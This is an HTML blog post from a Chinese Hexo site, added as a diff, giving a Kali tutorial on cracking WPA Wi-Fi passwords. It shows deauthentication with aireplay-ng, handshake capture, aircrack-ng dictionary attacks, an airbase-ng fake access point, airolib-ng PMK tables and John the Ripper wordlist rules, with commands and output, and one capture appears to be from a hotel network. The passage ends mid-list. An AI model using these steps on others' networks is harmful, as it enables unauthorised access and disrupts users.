@@ -1,0 +1,1252 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Kali,无线攻击,Tool,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="01-姿势一：普通的WPA破解1.1-简介 基于字典的破解，字典越大，命中率越高，若密码异常复杂，则不会破解出来（即使字典很大，不包含也白搭） WPA2比WPA1更加安全，理论上是这样，因为其加密算法更加安全，但现实中，无论是WPA还是WPA2，如果设置高强度密码，则破解难度都很大，几乎都是难以破解（故实际中，二者破解难度可以看作是一样的） 破解WPA是有一定运气成分的 字典来源">
+<meta name="keywords" content="Kali,无线攻击,Tool">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WPA攻击">
+<meta property="og:url" content="http://21guns.top/2019/02/18/WPA攻击/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="01-姿势一：普通的WPA破解1.1-简介 基于字典的破解，字典越大，命中率越高，若密码异常复杂，则不会破解出来（即使字典很大，不包含也白搭） WPA2比WPA1更加安全，理论上是这样，因为其加密算法更加安全，但现实中，无论是WPA还是WPA2，如果设置高强度密码，则破解难度都很大，几乎都是难以破解（故实际中，二者破解难度可以看作是一样的） 破解WPA是有一定运气成分的 字典来源">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/48835764.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/43950487.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/22015951.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/59371932.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/69395113.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/92843293.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/31015488.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-8/80358421.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-8/72981338.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-8/9948573.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-8/98318349.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-8/76514660.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-8/3546928.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-10/41999333.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-10/10223264.jpg?ynotemdtimestamp=1550490850588">
+<meta property="og:updated_time" content="2019-02-18T12:01:40.369Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WPA攻击">
+<meta name="twitter:description" content="01-姿势一：普通的WPA破解1.1-简介 基于字典的破解，字典越大，命中率越高，若密码异常复杂，则不会破解出来（即使字典很大，不包含也白搭） WPA2比WPA1更加安全，理论上是这样，因为其加密算法更加安全，但现实中，无论是WPA还是WPA2，如果设置高强度密码，则破解难度都很大，几乎都是难以破解（故实际中，二者破解难度可以看作是一样的） 破解WPA是有一定运气成分的 字典来源">
+<meta name="twitter:image" content="http://ot12pfxkm.bkt.clouddn.com/18-2-3/48835764.jpg?ynotemdtimestamp=1550490850588">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2019/02/18/WPA攻击/">
+
+
+
+
+
+  <title>WPA攻击 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2019/02/18/WPA攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WPA攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-18T19:54:18+08:00">
+                2019-02-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/无线安全/" itemprop="url" rel="index">
+                    <span itemprop="name">无线安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="01-姿势一：普通的WPA破解"><a href="#01-姿势一：普通的WPA破解" class="headerlink" title="01-姿势一：普通的WPA破解"></a>01-姿势一：普通的WPA破解</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1-简介"></a>1.1-简介</h2><ul>
+<li>基于字典的破解，字典越大，命中率越高，若密码异常复杂，则不会破解出来（即使字典很大，不包含也白搭）</li>
+<li>WPA2比WPA1更加安全，理论上是这样，因为其加密算法更加安全，但现实中，无论是WPA还是WPA2，如果设置高强度密码，则破解难度都很大，几乎都是难以破解（故实际中，二者破解难度可以看作是一样的）</li>
+<li>破解WPA是有一定运气成分的</li>
+<li>字典来源<a id="more"></a><ul>
+<li>网上共享的字典（质量低）</li>
+<li>已泄露的密码</li>
+<li>某一地区电话号码段</li>
+<li>Crunch生成字典（生日等社工相关信息）</li>
+<li>Kali中自带的字典文件（通用的，并不是无线破解专用）</li>
+</ul>
+</li>
+<li>WPA安全很多，只有一种密码破解方法<ul>
+<li>WPA不存在WEP的弱点</li>
+</ul>
+</li>
+<li>只能暴力破解，影响暴力破解的因素<ul>
+<li>CPU资源</li>
+<li>时间</li>
+<li>字典质量</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-2-破解过程"><a href="#1-2-破解过程" class="headerlink" title="1.2-破解过程"></a>1.2-破解过程</h2><blockquote>
+<p>WPA破解过程比WEP简单很多，但是破解难度要难太多</p>
+</blockquote>
+<p><strong>（1）启动monitor</strong></p>
+<ul>
+<li><code>airmon-ng check kill</code></li>
+<li><code>airmon-ng start wlan0</code></li>
+</ul>
+<p><strong>（2）开始抓包并保存本地</strong></p>
+<ul>
+<li><p><code>airodump-ng --bssid 30:49:3B:09:F3:88 -c 1 -w dell wlan0mon</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CH  1 ][ Elapsed: 2 mins ][ 2018-02-03 20:21 ][ WPA handshake: 30:49:3B:09:F3:88                                                                              </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line">30:49:3B:09:F3:88  -55 100      941     4283   25   1  54   WPA2 CCMP   PSK  HUAZHU_Hanting                                           </span><br><span class="line">BSSID              STATION            PWR   Rate    Lost    Frames  Probe                     </span><br><span class="line">30:49:3B:09:F3:88  AC:D1:B8:C7:DC:3F  -35   54 -24      0     4216 </span><br><span class="line">30:49:3B:09:F3:88  70:F0:87:7F:2B:91  -38   54 -24      0     1497</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>（3）Deauthentication攻击获取4步握手信息</strong></p>
+<ul>
+<li><p><code>aireplay-ng -0 1 -a 30:49:3B:09:F3:88 -c 70:F0:87:7F:2B:91 wlan0mon</code>来打掉STA和AP之间的连接</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-3/48835764.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<ul>
+<li>可以看到，airodump中已抓到WPA的握手信息</li>
+<li>自己的手机明显掉了一会线，其尝试重连时数据包被抓</li>
+</ul>
+</li>
+</ul>
+<p><strong>（4）使用字典暴力破解/</strong></p>
+<ul>
+<li><p><code>aircrack-ng -w dic.txt dell-01.cap</code></p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-3/43950487.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<ul>
+<li><p>若密码存在与字典中，是可以破解出来的</p>
+</li>
+<li><p>测试所用，故将密码直接写入字典文件（由此可见，字典很重要！）</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-3/22015951.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-3/59371932.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="02-姿势二：无AP的WPA破解"><a href="#02-姿势二：无AP的WPA破解" class="headerlink" title="02-姿势二：无AP的WPA破解"></a>02-姿势二：无AP的WPA破解</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1-简介"></a>2.1-简介</h2><ul>
+<li><p>适用场景</p>
+<ul>
+<li><p>H附近只有某客户端STA，而没有AP</p>
+</li>
+<li><p>STA以前连接过AP，到了一个新环境后，仍然会发送probe，来探测这个AP是否依然在自己范围内</p>
+</li>
+<li><p>H利用STA发送的探测包，就可以破解出其曾经连接过的AP的密码</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-3/69395113.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-2-攻击原理"><a href="#2-2-攻击原理" class="headerlink" title="2.2-攻击原理"></a>2.2-攻击原理</h2><ul>
+<li>图示</li>
+</ul>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-3/92843293.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-3/31015488.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<ul>
+<li><p>相关值</p>
+<ul>
+<li>PMK：是未知且要破解的值。是ESSID+密钥（即PSK，预设共享密钥），进行4096次哈希计算后（需要消耗大量的时间资源），生成的哈希值</li>
+<li>Anonce：AP向STA发送一个Anonce，为Nonce1（anthenticator—AP，supplicant—STA）</li>
+<li>Snonce：STA本地也会生成一个Snonce，为Nonce2</li>
+<li>MAC地址：STA要与AP通信，自然知道二者的MAC地址，即MAC1和MAC2</li>
+<li>PTK及其MIC：PMK结合这四者，生成PTK，将PTK的MIC（一个摘要信息）连同Snonce发往AP</li>
+</ul>
+</li>
+<li><p>破解原理</p>
+<ul>
+<li><p><strong>Anonce、Snonce已知</strong>：二者是明文传输的，可以在通信过程中抓取到，这样，相关的信息在四步握手的前两步就可以获得，就可以进行相应的破解</p>
+</li>
+<li><p><strong>ESSID已知</strong>：H自己伪造一个AP（STA试图探测的AP名字）</p>
+</li>
+<li><p><strong>MAC地址已知</strong>：airodump抓包，可以得到STA的MAC和其探测的AP的名字（即ESSID</p>
+</li>
+<li><p>PMK未知</p>
+<p>：是ESSID+密钥（即PSK，预设共享密钥），进行哈希计算后，生成的值</p>
+<ul>
+<li>ESSID已知，PSK是想知道的，有二者便可的PMK</li>
+<li>Anounce和Snonce、MAC1和MAC2、MIC（PTK的摘要信息）已知</li>
+</ul>
+</li>
+<li><p><strong>唯独PSK未知，以此尝试，ESSID+PSKx=PMKx，PMKx+四信息=PTKx，PTKx得其摘要MICx，再与真正MIC比较，若一致则PSK正确</strong></p>
+</li>
+<li><p>理论上，是可以破解出来的。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-3-破解过程"><a href="#2-3-破解过程" class="headerlink" title="2.3-破解过程"></a>2.3-破解过程</h2><blockquote>
+<ol>
+<li>启动monitor</li>
+<li>开始抓包并保存</li>
+<li>根据probe信息伪造相同的ESSID的AP</li>
+<li>抓取四步握手中的前两个包</li>
+<li>使用字典暴力破解</li>
+</ol>
+</blockquote>
+<ul>
+<li><p>启动monitor</p>
+<ul>
+<li><code>airmon-ng check kill</code></li>
+<li><code>airmon-ng start wlan0</code></li>
+</ul>
+</li>
+<li><p>开始抓包并保存</p>
+<ul>
+<li><p><code>ariodump-ng wlan0mon -w dell</code></p>
+</li>
+<li><p>抓到探测“DELL”的包</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-8/80358421.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p>根据probe信息伪造相同的ESSID的AP</p>
+<ul>
+<li><p><code>airbase-ng --essid DELL -Z 4 wlan0mon</code></p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-8/72981338.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-8/9948573.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-8/98318349.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p>抓取四步握手中的前两个包</p>
+<ul>
+<li>理想情况下会抓到握手过程（四步握手的前两步</li>
+<li>但是实际测试时，握手过程抓取失败</li>
+</ul>
+</li>
+<li><p>使用字典暴力破解</p>
+<ul>
+<li><code>aircrack-ng -w dic.txt xxx.cap</code>（若抓到握手包）</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-4-其它"><a href="#2-4-其它" class="headerlink" title="2.4-其它"></a>2.4-其它</h2><ul>
+<li><p>理论上是可以破解出来的，但是比较鸡肋的是，需要到AP范围内才可以上网（尾随STA）</p>
+</li>
+<li><p>伪造AP是一个关键问题：</p>
+<ul>
+<li>airbase-ng，可以将本机网卡，创建一个AP出来</li>
+<li>如：<code>airbase-ng --essid DELL -c 11 wlan0mon</code></li>
+</ul>
+</li>
+<li><p>存在一问题，即伪造的AP，其采用什么身份认证和加密方式是未知的</p>
+<ul>
+<li>为提高准确性，即保证STA能与伪造后的AP通信，可以创建多个AP</li>
+<li>分别采取不同的身份认证和加密方式：OPEN不用身份认证、WEP、WPA、WPA2</li>
+<li>但是网卡可能不支持创建多个类型的网卡，也可能是虚拟机环境的缘故，物理机下是可用的，实测只创建出WPA2的</li>
+</ul>
+</li>
+<li><p>创建不同类型AP</p>
+<ul>
+<li><p>默认是OPEN的方式，不采用任何身份认证，随便连</p>
+</li>
+<li><p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-8/76514660.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+</li>
+<li><p><code>airbase-ng --essid DELL -c 11 -z 2 wlan0mon</code>（z：表WPA；2：表TKIP加密）</p>
+</li>
+<li><p><code>airbase-ng --essid DELL -c 11 -Z 4 wlan0mon</code>（Z：表WPA2；4：表CCMP加密）</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-8/3546928.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+</li>
+<li><p>具体参数，–help</p>
+</li>
+</ul>
+</li>
+<li><p>理想情况下，握手情况会被抓取到，但实际测试时不尽人意</p>
+</li>
+</ul>
+<blockquote>
+<p>WPA破解的姿势就是上述两种，目前还没有发现第三种攻击手法可用</p>
+</blockquote>
+<h1 id="03-其它工具"><a href="#03-其它工具" class="headerlink" title="03-其它工具"></a>03-其它工具</h1><h2 id="3-1-airolib"><a href="#3-1-airolib" class="headerlink" title="3.1-airolib"></a>3.1-airolib</h2><h3 id="（1）简介"><a href="#（1）简介" class="headerlink" title="（1）简介"></a>（1）简介</h3><ul>
+<li>提高破解效率<ul>
+<li>WPA破解的姿势就是上述两种，目前还没有发现第三种攻击手法可用</li>
+<li>对于WPA，关键不是如何抓到供破解的信息（即数据包），而是如何高效率的完成破解工作</li>
+<li>WPA破解，后期的破解过程远比前期的信息收集（即抓包）重要的多</li>
+<li>Kali中集成了许多提高WPA破解效率的工具，airolib便是其中之一</li>
+</ul>
+</li>
+<li><p>思路：</p>
+<ul>
+<li>WPA破解原理：PSK未知，依次尝试，ESSID+PSKx=PMKx，PMKx+四信息=PTKx，PTKx得其摘要MICx，再与真正MIC比较，若一致则PSK正确</li>
+<li>由无AP的WPA破解可得知，破解WPA主要有两个过程：计算PMK和PTK<ul>
+<li>PMK需要4096次哈希计算，需大量时间资源和CPU资源</li>
+<li>计算PTK及其MIC值，相比就不需要那么多资源</li>
+</ul>
+</li>
+<li>故WPA破解的主要难度是在PMK计算上</li>
+<li>思路：先将最麻烦的PMK计算出来，存储在一个表，需要时直接拿来用</li>
+<li>最后比较MIC是否一致来确定尝试的密码是否正确，若正确，则反推出密码</li>
+</ul>
+</li>
+<li><p>简介</p>
+<ul>
+<li>airolib是aircrack-ng套件中工具之一，用于提高破解效率</li>
+<li>使用了数据库，存放ESSID、明文密码列表、计算生成的PMK值</li>
+<li>若目标网络更改了ESSID即网络名，那么之前生成的PMK就全部失效了，就需要重新开始生成</li>
+<li>针对某一个ESSID，提前生成PMK表，破解的时候直接拿来用</li>
+<li>适应场景：针对一个特定无线网络（其密码经常更改，但是其ESSID不改）</li>
+<li>设计用于存储ESSID和密码列表<ul>
+<li>计算生成不变的PMK（计算资源消耗型</li>
+<li>PMK在破解阶段被用于计算PTK</li>
+<li>通过完整性摘要值破解密码</li>
+<li>SQLite3数据库存储数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="（2）实例演示"><a href="#（2）实例演示" class="headerlink" title="（2）实例演示"></a>（2）实例演示</h3><ul>
+<li><p>简要步骤</p>
+<ul>
+<li><p><code>echo kifi &gt; essid.txt</code> （ESSID写入文本文件，可写入多个ESSID）</p>
+</li>
+<li><p><code>airolib-ng db --import essid essid.txt</code> （创建数据库db，同时从本地导入ESSID）</p>
+</li>
+<li><p><code>airolib-ng db --stats</code> （查看数据库状态）</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airolib-ng db --import passwd dic.txt</span><br></pre></td></tr></table></figure>
+<p>（导入密码文件）</p>
+<ul>
+<li>自动剔除不合格的WPA字典</li>
+<li>不是每一个密码都使用WPA破解，例如小于8个字符</li>
+</ul>
+</li>
+<li><p>可以再次stats查看状态，发现密码已导入</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airolib-ng db --batch</span><br></pre></td></tr></table></figure>
+<ul>
+<li>生成PMK哈希值</li>
+<li>根据ESSID和密码列表，组合在一起，进行4096次哈希计算，得到PMK，供后续使用</li>
+</ul>
+</li>
+<li><p><code>aircrack-ng -r db wpa.cap</code>（通过db中存取的PMK，来进行破解）</p>
+</li>
+</ul>
+</li>
+<li><p>实例演示</p>
+<ol>
+<li><p>essid写入指定文件，以便后续导入数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo D-Link_DIR-612 &gt; essid.txt</span><br><span class="line">root@kali:~# cat essid.txt </span><br><span class="line">D-Link_DIR-612</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建数据库并导入esssid</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --import essid essid.txt </span><br><span class="line">Database &lt;db&gt; does not already exist, creating it...</span><br><span class="line">Database &lt;db&gt; successfully created</span><br><span class="line">Reading file...</span><br><span class="line">Writing...</span><br><span class="line">Done.</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>导入存放密码的字典文件（密码即PSK，即待破解的无线密码）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --import passwd dic.txt </span><br><span class="line">Reading file...</span><br><span class="line">Writing...s read, 0 invalid lines ignored.</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看数据库状态，essid和password已经导入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --stats</span><br><span class="line">There are 1 ESSIDs and 11 passwords in the database. 0 out of 11 possible combinations have been computed (0%).</span><br><span class="line"></span><br><span class="line">ESSID	Priority	Done</span><br><span class="line">D-Link_DIR-612	64	0.0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开始生成PMK值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --batch</span><br><span class="line">Computed 11 PMK in 0 seconds (11 PMK/s, 0 in buffer). All ESSID processed.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开始破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# aircrack-ng -r db test.cap </span><br><span class="line">Opening test.cap</span><br><span class="line">Read 9088 packets.</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  C4:A8:1D:E1:65:F8  D-Link_DIR-612            WPA (1 handshake)</span><br><span class="line">Choosing first network as target.</span><br><span class="line">Opening test.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line">      [00:00:00] 2/0 keys tested (820.01 k/s) </span><br><span class="line">      Time left: 0 seconds                                   inf%</span><br><span class="line">                           KEY FOUND! [ 12341234 ]</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="3-2-JTR（john）"><a href="#3-2-JTR（john）" class="headerlink" title="3.2-JTR（john）"></a>3.2-JTR（john）</h2><h3 id="（1）简介-1"><a href="#（1）简介-1" class="headerlink" title="（1）简介"></a>（1）简介</h3><ul>
+<li>join the ripper</li>
+<li>不仅支持无线破解，还支持其它</li>
+<li>支持基于规则扩展密码字典，动态生成</li>
+<li>不同于airolib提前生成PMK，不是用来提高破解速度的</li>
+<li>是为了动态生成密码，避免大文件字典占用物理空间</li>
+<li>关键点<ul>
+<li>构造基础密码文件</li>
+<li>编写动态生成密码的规则</li>
+<li>小密码字典+规则=旁大密码字典=节约物理空间</li>
+</ul>
+</li>
+</ul>
+<h3 id="（2）实例演示-1"><a href="#（2）实例演示-1" class="headerlink" title="（2）实例演示"></a>（2）实例演示</h3><ul>
+<li><p>实例演示（利用JTR动态生成手机号）</p>
+<ul>
+<li>很多人喜欢用手机号码做为无线密码（获取号码并利用JTR规则增加最后几位的数字</li>
+</ul>
+</li>
+<li><p>网上得某地区某个手机号段，并保存到本地，作为基础密码文件（后续在其基础上动态生成手机号</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-10/41999333.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gedit base.txt</span><br><span class="line">root@kali:~# more base.txt</span><br><span class="line">1340226</span><br><span class="line">1340536</span><br><span class="line">1340646</span><br><span class="line">1340647</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改配置文件<code>/etc/john/john.conf</code></p>
+<ul>
+<li><p>搜索<code>[List.Rules:Wordlist]</code>，在其这一段最后添加规则，如下</p>
+</li>
+<li><p><code>$[0-9]$[0-9]$[0-9]$[0-9]</code>（表示后面再加4位数字）</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-2-10/10223264.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p>测试效果</p>
+<ul>
+<li><p><code>john --wordlist=base.txt--rules --stdou</code></p>
+</li>
+<li><p>在base.txt得基础上，根据规则，动态生成了大量密码</p>
